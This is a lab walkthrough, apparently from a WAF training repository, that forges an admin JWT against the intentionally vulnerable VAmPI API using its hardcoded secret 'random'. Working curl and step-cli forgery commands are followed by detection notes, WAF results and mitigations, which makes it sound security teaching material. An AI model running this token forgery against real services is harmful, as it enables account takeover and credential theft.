# 03 — VAmPI JWT Weak-Key Forgery

**Vulnerability class:** [OWASP API2:2023 — Broken Authentication](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/).

VAmPI signs JWTs with a trivial HMAC secret hardcoded in the source. An
attacker who discovers (or guesses) the secret can forge tokens for any
user without their password.

## Setup

Seeded users already exist in VAmPI. You'll need:

- `jwt-cracker` or `hashcat` to brute-force the secret (or skip this —
  we'll show the shortcut). Ships in the lab via `step crypto`.
- `step-cli` for decoding and re-signing. Installed by
  [`scripts/install-ubuntu.sh`](../../scripts/install-ubuntu.sh).

The VAmPI secret is [publicly documented in the project's source](https://github.com/erev0s/VAmPI/blob/main/config.py):
`random`. Yes, the word. That's the whole secret.

## Baseline: attack succeeds (WAF off)

### Step 1 — Get a legitimate user's token

```bash
HOST_IP=$(grep ^LAB_HOST_IP lab.env | cut -d= -f2)
DOMAIN=$(grep ^LAB_DOMAIN   lab.env | cut -d= -f2)

TOKEN=$(curl -sk -X POST \
  --resolve "vampi.${DOMAIN}:443:${HOST_IP}" \
  "https://vampi.${DOMAIN}/users/v1/login" \
  -H 'Content-Type: application/json' \
  -d '{"username":"name1","password":"pass1"}' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["auth_token"])')

# Decode to see the structure
step crypto jwt inspect --insecure <<< "$TOKEN" | python3 -m json.tool
```

Expected payload:

```json
{
  "header": {"typ": "JWT", "alg": "HS256"},
  "payload": {"exp": 1745..., "sub": "name1"}
}
```

Note: `alg: HS256` — HMAC with SHA-256. Symmetric. If we know the secret,
we can forge.

### Step 2 — Forge a token claiming to be admin

```bash
# Build a new JWT with sub=admin, signed with the known weak secret
FORGED=$(step crypto jwt sign \
  --key <(echo -n "random") \
  --alg HS256 \
  --subtle \
  --sub admin \
  --exp $(($(date +%s) + 3600)))

echo "Forged token: ${FORGED:0:40}..."
```

### Step 3 — Use the forged token

```bash
# Hit an admin-only endpoint
curl -sk \
  --resolve "vampi.${DOMAIN}:443:${HOST_IP}" \
  -H "Authorization: Bearer ${FORGED}" \
  "https://vampi.${DOMAIN}/users/v1/_debug" \
  | python3 -m json.tool
```

**Expected (attack succeeds):**

```json
{
  "users": [
    {"username": "name1", "password": "pass1", "admin": false, "email": "..."},
    {"username": "name2", "password": "pass2", ...},
    {"username": "admin",  "password": "pass1", "admin": true,  ...}
  ]
}
```

The debug endpoint returns every user's credentials in plaintext — a
separate crAPI-grade bug, but it's what VAmPI gives us to demonstrate
the impact of token forgery.

## Observability

**Grafana panel:** *Total Request Rate* blips once. The panel doesn't
know the token is forged — the scrape interval aggregates this with
legitimate traffic.

**Log tail (`task logs:nginx`):**

```
<attacker-ip> - - [..] "GET /users/v1/_debug HTTP/1.1" 200 ...
```

Identical shape to a legitimate admin request. **This is the hard part
of detection** — the bearer token is syntactically valid, the signature
verifies (with the weak secret), and the JWT claim says `admin`.

## Protected: attack blocked (`task waf-on`)

### On NGINX Plus

App Protect's default policy doesn't crack JWTs, but in a real
deployment you'd use:

```yaml
# Placeholder — not in this lab's default policy set
policy:
  jwt:
    minKeyLength: 256         # reject short-key JWTs
    algorithms: [RS256, ES256]  # reject symmetric algorithms
```

None of that is in [`policies/ap-policy-owasp.yaml`](../../policies/ap-policy-owasp.yaml)
because JWT policy is app-specific. The signature-based rules in the
OWASP CRS pack do catch the `_debug` path itself (it's on the default
blacklist), so:

```bash
task waf-on
# re-run step 3
```

Expected on Plus:
```
HTTP/1.1 403 Forbidden — support_id="..." attack_type="Predictable-Resource-Location"
```

The forged JWT was valid, but the endpoint it tried to reach triggered
a different rule (admin-panel path pattern).

### On OSS (shadow mode)

No enforcement. The attack succeeds identically to baseline.

**To mitigate on OSS (application layer):**

1. **Rotate the secret** to something with ≥256 bits of entropy:
   ```bash
   kubectl set env deploy/vampi -n vampi JWT_SECRET="$(openssl rand -hex 64)"
   ```
2. **Move to asymmetric signing** (RS256/ES256). Impossible for an
   attacker to forge tokens without the private key, even if the public
   key is leaked.
3. **Short expiries + refresh tokens**. Even if a forgery succeeds,
   the window is small.
4. **Token revocation list** for compromised tokens.

No WAF delivers any of this. JWT hygiene is fundamentally an application
concern.

## Real-world correlate

- **Auth0 2020 "algorithm confusion" CVE-2020-28042:** attackers sent
  `alg: none` JWTs that some libraries accepted, forging any identity.
- **Countless startups**: defaults like `jwt_secret = "secret"` in
  tutorials leaked via GitHub scraping.

## Further experiments

- Use [`jwt_tool`](https://github.com/ticarpi/jwt_tool) to automate
  scanning for common weak secrets.
- Try the `alg: none` attack — rewrite the token header to use no
  signature at all. Most modern libraries reject this, but it's worth
  confirming in VAmPI.
- Decode the Locust-generated crAPI JWTs (after `task locust`) with the
  same `step crypto jwt inspect` — crAPI uses RS256 with a rotating
  key, so the same attack fails. That's the contrast you want students
  to internalize.
